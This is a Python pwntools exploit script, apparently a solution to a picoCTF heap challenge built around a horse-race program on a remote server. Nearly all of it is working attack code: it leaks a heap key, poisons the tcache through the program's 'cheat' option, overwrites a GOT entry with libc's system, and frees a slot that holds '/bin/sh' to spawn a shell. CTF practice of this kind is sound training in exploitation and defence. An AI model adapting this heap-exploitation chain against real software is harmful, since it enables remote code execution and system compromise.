#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 6666 ./vuln
from pwn import *

# Set up pwntools for the correct architecture
#exe = context.binary = ELF('./vuln')
exe = context.binary = ELF('./vuln_fast')
libc_path = './libc.so.6'
libc = ELF(libc_path)


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 51885)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#tbreak *0x{exe.entry:x}
continue
'''.format(**locals())


def add_horse(io, stable:int, length:int, data) -> None:
    io.sendline(b'1')
    io.recvuntil(b'?')
    io.sendline(str(stable))
    io.recvuntil(b'?')
    io.sendline(str(length))
    io.recvuntil(b':')
    io.sendline(data)

def remove_horse(io, stable:int) -> None:
    io.sendline(b'2')
    io.recvuntil(b'?')
    io.sendline(str(stable))

def race(io) -> None:
    io.sendline(b'3')

def cheat(io, stable:str, data, newspot: str) -> None:
    io.sendline(b'0')
    io.recvuntil(b'?')
    io.sendline(str(stable))
    io.recvuntil(b':')
    io.sendline(data)
    io.recvuntil(b'spot?')
    io.sendline(str(newspot))

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'

io = start()
prompt=b'Choice:'
io.recvuntil(prompt)

length=16
add_horse(io, 0, length, b'a'*length)
add_horse(io, 1, length, b'a'*length)
add_horse(io, 2, length, b'a'*length)
add_horse(io, 3, length, b'a'*length)
add_horse(io, 17, length, b'e'*length)

# populate spot 17 with the address>>12 offset
remove_horse(io, 17)
# set up so we can leak the secret offset
add_horse(io, 17, length, b'\xff')
race(io)
data = io.recvuntil('WINNER: ')
leak = io.recvuntil('\n')
if b'aaa' in leak:
    print('FAILED to win, better luck next time')
    io.close
    sys.exit()


print(f'LEAK: {leak.strip()}')
leak_int = u16(leak.rstrip())
print(f'LEAK: {hex(leak_int)}')
print(f'Start of ptr_player_struct 0x2a0+(leak<<12): {hex((leak_int<<12)+0x2a0)}')


# Populate 0x20 tcache bin with 2 chunks on list
remove_horse(io, 3)
remove_horse(io, 17)


length=0x20
add_horse(io, 3, length, b'a'*length)
add_horse(io, 4, length, b'a'*length)
remove_horse(io, 4)
remove_horse(io, 3)
#io.interactive()
payload = p32(((leak_int<<12)+0x2a0)^leak_int)
payload += b'\xff'
cheat(io, 3, payload, 0x30)

print("next is the cheat, reset")
payload = p32((0x4040ec-12)^leak_int)
payload += b'\xff'
cheat(io, 17, payload, 2)

add_horse(io, 5, 0x20, b'4'*length)
# this will be the overwrite for the ptr_player_struct...
payload = p64(0x00000000404018)
payload += p32(0x99) # ensure a win
payload += p32(0x1) # enable slot
payload += b'\xff'
add_horse(io, 6, 0x20, payload)

add_horse(io, 14, 16, b'4'*length)
add_horse(io, 15, 16, b'\x00'*length)

race(io)
data = io.recvuntil('WINNER: ')
libc_leak = io.recvuntil('\n')
if b'aaa' in libc_leak:
    print('FAILED to win, better luck next time')
    io.close
    sys.exit()

OFFSET=0x1e19d0
libc_leak=libc_leak.rstrip()
libc_leak+=b'\x00'*(8-len(libc_leak))
print(f'LIBC_LEAK: {libc_leak}, len{len(libc_leak)}')
libc_leak_int = u64(libc_leak)
print(f'LIBC_LEAK: {hex(libc_leak_int)}')
LIBC_BASE=libc_leak_int-OFFSET
LIBC_BASE=libc_leak_int-libc.symbols.free
print(f'LIBC_BASE: {hex(LIBC_BASE)}')

#io.interactive()
#payload = p64(libc_leak_int)
payload = b''
payload += p64(LIBC_BASE+libc.symbols.system)
print(hex(LIBC_BASE+libc.symbols.free))

# The server will add \x00 and we can't have that overwrite the next pointer
# So ensure we only send what we really need
newp = payload[:-2]
newp += b'\xff'

cheat(io, 2, "/bin/sh\x00\xFF", 0)
cheat(io, 0, newp, 90)

#Trigger call to system with /bin/bash by freeing our #2 slot
remove_horse(io,2)

"""
io.sendline('cat /challenge/vuln.c')

with open('source.c', 'wb') as f:
    while True:
        data = io.recv(1000)
        f.write(data)
"""

io.interactive()

